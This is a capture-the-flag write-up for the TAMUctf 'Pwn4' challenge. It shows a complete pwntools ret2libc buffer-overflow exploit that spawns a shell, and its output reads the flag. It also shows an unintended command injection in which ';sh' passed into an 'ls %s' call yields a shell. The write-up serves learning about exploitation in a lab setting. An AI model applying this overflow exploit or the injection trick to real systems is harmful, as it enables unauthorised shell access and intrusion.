## Pwn4 - Pwn

**Description:** ```nc pwn.tamuctf.com 4324```
**Challenge:** : pwn4
**Difficulty:** medium
**Solved by:** Neolex  

**Solution:**  
The vulnerability is, again, a call to the vulnerable **gets** function. We need 37 bytes to be send to overwrite the return address. This time we don't have a print_flag function so we're going to use ret2libc to call **system** with the **/bin/sh**  strings :
Let's find a call to system  : 
```
.text:080485AD                 call    _system
```
The address is 0x080485AD. now let's find an adress of a **/bin/sh** function in GDB : 
```
gdb-peda$ searchmem /bin/sh
Searching for '/bin/sh' in: None ranges
Found 2 results, display max 2 items:
pwn4 : 0x804a034 ("/bin/sh")
```
the address is 0x804a034
Here is the exploit code :
```python
from pwn import *

system = 0x080485AD
binsh = 0x804a034

p = remote('pwn.tamuctf.com', 4324)
p.recvuntil('ls:')

payload = "A"*37
payload += p32(system)
payload += p32(binsh)
p.sendline(payload)
p.interactive()
```
run the exploit : 
```
$ python exploit.py                         
[+] Opening connection to pwn.tamuctf.com on port 4324: Done
[*] Switching to interactive mode

Result of ls AAAAAAAAAAAAAAAAAAAAAAA:
$ ls
flag.txt
pwn4
$ cat flag.txt
gigem{5y573m_0v3rfl0w}
```
**Unintended Solution:**  
 the was an unintended solution to this challenge by just sending : ";sh" and we get a shell.
The issue here was that the input was print inside the string "ls %s" so if we stop the ls command with **;** and call sh command we get a shell :
```
$ nc pwn.tamuctf.com 4324
ls as a service (laas)(Copyright pending)
Enter the arguments you would like to pass to ls:
;sh
Result of ls ;sh:
flag.txt
pwn4
ls
flag.txt
pwn4
cat flag.txt
gigem{5y573m_0v3rfl0w}
```
**Flag:**  
gigem{5y573m_0v3rfl0w}

